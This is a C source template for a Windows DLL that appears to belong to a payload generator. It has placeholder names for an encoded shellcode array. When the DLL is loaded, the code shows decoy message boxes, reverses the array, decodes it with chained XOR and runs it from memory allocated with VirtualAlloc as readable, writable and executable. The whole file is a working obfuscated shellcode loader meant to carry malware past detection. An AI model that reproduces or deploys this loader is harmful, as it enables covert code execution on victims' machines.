#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "user32.lib")

unsigned char <NAME_TO_REPLACE>[] = <CODE_TO_REPLACE>; 
int size = sizeof(<NAME_TO_REPLACE>);

int strrev(char *str)
{
	int len = strlen(str);

	int i, temp;
	for (i = 0; i < len/2; i++) {
		temp = str[i];
		str[i] = str[len-i-1];
		str[len-i-1] = temp;
	}

	return 0;
}

int <FUNCTION_TO_REPLACE>(void) {
	MessageBox(NULL,"Program","is on progess",MB_OK);

	strrev(<NAME_TO_REPLACE>);
	unsigned char <NAME_TO_REPLACE>2[size];

	int i, len = strlen(<NAME_TO_REPLACE>);
	for (i = 0; i < len-1; i++) 
		<NAME_TO_REPLACE>2[i] = <NAME_TO_REPLACE>[i] ^ <NAME_TO_REPLACE>[i+1];
	<NAME_TO_REPLACE>2[i] = <NAME_TO_REPLACE>[i];
	<NAME_TO_REPLACE>2[++i] = '\0';
	strrev(<NAME_TO_REPLACE>2);
	
   	void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    	memcpy(exec, <NAME_TO_REPLACE>2, size);
    	((void(*)())exec)();

    	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved)
{
   	switch (nReason){
    	case DLL_PROCESS_ATTACH:
        	MessageBox(NULL,"Checkpoint","done",MB_OK);
		<FUNCTION_TO_REPLACE>();
        	break;
    	case DLL_PROCESS_DETACH:
        	break;
    	case DLL_THREAD_ATTACH:
        	break;
    	case DLL_THREAD_DETACH:
        	break;
    	}
    	
	return TRUE;
}
